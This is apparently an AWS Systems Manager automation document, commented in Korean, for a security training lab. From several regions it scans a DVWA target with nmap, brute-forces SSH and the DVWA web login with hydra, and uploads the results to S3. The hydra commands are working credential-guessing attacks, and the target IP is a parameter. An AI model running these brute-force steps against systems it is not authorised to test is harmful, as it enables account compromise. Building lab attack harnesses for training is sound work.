schemaVersion: '2.2'
description: |
  지리별 공격자 노드에서 서울 DVWA 대상으로 자동 공격을 실행한다.
  ① nmap 포트/서비스 스캔  ② hydra SSH 무차별 대입  ③ hydra DVWA 웹 로그인 무차별 대입.
  결과는 S3(스캔 결과 버킷)에 업로드한다. 대시보드 "웹보안검사" 탭의 [시작]이 호출한다.
  격리된 팀 소유 실습 대상(DVWA)에만 사용한다.
parameters:
  TargetHost:
    type: String
    description: 공격 대상 DVWA 공인 IP (terraform output web_dvwa_public_ip)
    allowedPattern: '^[0-9]{1,3}(\.[0-9]{1,3}){3}$'
  ScanBucket:
    type: String
    description: 결과를 올릴 S3 버킷
  RegionLabel:
    type: String
    description: '공격 출발 지역 표기 (예: us-virginia)'
    default: unknown
  SshUser:
    type: String
    description: SSH 무차별 대입 대상 계정
    default: victim
  DvwaSession:
    type: String
    description: |
      DVWA 웹 무차별 대입용 PHPSESSID 쿠키값. 비우면 웹 공격은 건너뛴다.
      (DVWA 로그인 후 브라우저 쿠키에서 PHPSESSID 확인)
    default: ''
mainSteps:
  - action: 'aws:runShellScript'
    name: geoWebAttack
    inputs:
      runCommand:
        - '#!/bin/bash'
        - set -uo pipefail
        - TS=$(date +%Y%m%dT%H%M%SZ)
        - 'OUT="/tmp/atk-{{ RegionLabel }}-$TS.txt"'
        - 'echo "== ATK from {{ RegionLabel }} -> {{ TargetHost }} @ $TS ==" | tee "$OUT"'
        - '# 부팅 시 만든 attacker 이미지가 준비될 때까지 잠깐 대기'
        - 'for i in $(seq 1 30); do [ -f /opt/attacker/READY ] && break; sleep 5; done'
        - WL=/opt/attacker/wordlists
        - '# ① nmap'
        - 'echo "== [1] nmap ==" | tee -a "$OUT"'
        - 'docker run --rm attacker:latest nmap -Pn -sV -p 22,80,443,3306 "{{ TargetHost }}" 2>&1 | tee -a "$OUT" || true'
        - '# ② hydra SSH 무차별 대입'
        - 'echo "== [2] hydra ssh ({{ SshUser }}) ==" | tee -a "$OUT"'
        - 'docker run --rm -v $WL:/wl attacker:latest hydra -l "{{ SshUser }}" -P /wl/pass.txt -t 4 -f -I "ssh://{{ TargetHost }}" 2>&1 | tee -a "$OUT" || true'
        - '# ③ hydra DVWA 웹 로그인 무차별 대입 (세션 쿠키가 있을 때만)'
        - 'if [ -n "{{ DvwaSession }}" ]; then'
        - '  echo "== [3] hydra dvwa web ==" | tee -a "$OUT"'
        - '  docker run --rm -v $WL:/wl attacker:latest hydra -L /wl/users.txt -P /wl/pass.txt -t 4 -f "{{ TargetHost }}" http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie\: PHPSESSID={{ DvwaSession }}; security=low" 2>&1 | tee -a "$OUT" || true'
        - 'else'
        - '  echo "== [3] dvwa web skipped (DvwaSession 미지정) ==" | tee -a "$OUT"'
        - 'fi'
        - '# 결과 업로드 (지역별 프리픽스)'
        - 'aws s3 cp "$OUT" "s3://{{ ScanBucket }}/atk/{{ RegionLabel }}/$TS.txt"'
        - 'echo "uploaded to s3://{{ ScanBucket }}/atk/{{ RegionLabel }}/$TS.txt"'
